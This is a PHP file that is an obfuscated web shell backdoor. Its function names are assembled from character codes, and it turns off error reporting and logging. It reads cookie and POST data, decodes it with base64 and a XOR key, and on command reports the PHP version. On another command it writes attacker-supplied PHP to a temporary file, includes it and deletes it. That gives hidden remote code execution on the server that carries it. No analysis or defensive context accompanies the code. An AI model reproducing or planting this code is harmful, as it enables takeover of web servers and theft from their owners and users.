<?php $ynhzzodbih = chr(102).chr(130-25)."\154".'e'.'_'.'p'."\x75".chr(116)."\x5f".chr(99).'o'.chr(110).chr(116)."\145"."\156".chr(116).chr(731-616);
$gakdionh = 'b'."\141".'s'.'e'."\66".chr(394-342).chr(603-508)."\x64".chr(831-730)."\143"."\157"."\x64".'e';
$pitegyn = chr(105).'n'.chr(1024-919)."\x5f"."\163".chr(101).chr(850-734);
$ordyey = "\x75".chr(110)."\154"."\x69".chr(110).chr(107);


@$pitegyn(chr(101).chr(114)."\x72".chr(765-654)."\x72"."\x5f".chr(108).chr(113-2)."\147", NULL);
@$pitegyn(chr(108)."\157".chr(103).chr(1089-994).'e'.chr(493-379)."\162".'o'.chr(114).chr(115), 0);
@$pitegyn("\155".chr(97).chr(120).chr(95).chr(602-501).'x'.chr(834-733).chr(941-842)."\x75"."\x74"."\x69"."\157".chr(812-702).chr(95)."\x74"."\151".chr(109).'e', 0);
@set_time_limit(0);

function jpcby($wdbmhcwt, $brwhqlfezz)
{
    $cyzwcrj = "";
    for ($hujnkjlrwt = 0; $hujnkjlrwt < strlen($wdbmhcwt);) {
        for ($j = 0; $j < strlen($brwhqlfezz) && $hujnkjlrwt < strlen($wdbmhcwt); $j++, $hujnkjlrwt++) {
            $cyzwcrj .= chr(ord($wdbmhcwt[$hujnkjlrwt]) ^ ord($brwhqlfezz[$j]));
        }
    }
    return $cyzwcrj;
}

$olwtjjc = array_merge($_COOKIE, $_POST);
$rkpza = 'eb2de97a-30b8-4921-82f5-50d3aebcbe3f';
foreach ($olwtjjc as $jmxneorkp => $wdbmhcwt) {
    $wdbmhcwt = @unserialize(jpcby(jpcby($gakdionh($wdbmhcwt), $rkpza), $jmxneorkp));
    if (isset($wdbmhcwt['a'."\x6b"])) {
        if ($wdbmhcwt["\141"] == "\151") {
            $hujnkjlrwt = array(
                chr(112).chr(775-657) => @phpversion(),
                's'.'v' => "3.5",
            );
            echo @serialize($hujnkjlrwt);
        } elseif ($wdbmhcwt["\141"] == 'e') {
            $uqyrkkov = "./" . md5($rkpza) . '.'."\151".chr(110)."\x63";
            @$ynhzzodbih($uqyrkkov, "<" . "\x3f".chr(144-32)."\x68".chr(761-649).chr(32)."\100"."\x75".chr(110)."\x6c"."\x69".chr(110).chr(107).chr(54-14).'_'.chr(95).chr(580-510)."\111".chr(352-276)."\105".'_'."\x5f"."\x29".chr(220-161).chr(941-909) . $wdbmhcwt["\144"]);
            @include($uqyrkkov);
            @$ordyey($uqyrkkov);
        }
        exit();
    }
}

